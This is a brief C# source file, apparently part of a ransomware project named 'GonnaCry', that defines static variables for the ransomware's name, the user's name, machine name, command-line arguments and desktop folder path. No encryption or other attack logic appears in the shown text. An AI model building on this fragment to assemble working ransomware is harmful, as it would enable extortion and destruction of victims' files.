using System;
namespace dotnet.environment
{
    public static class Variables
    {
        public static string ransomwareName = "GonnaCry";
        public static string username = Environment.UserName;
        public static string machineName = Environment.MachineName;
        public static string[] commandLineArgs = Environment.GetCommandLineArgs();
        public static string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
    }
}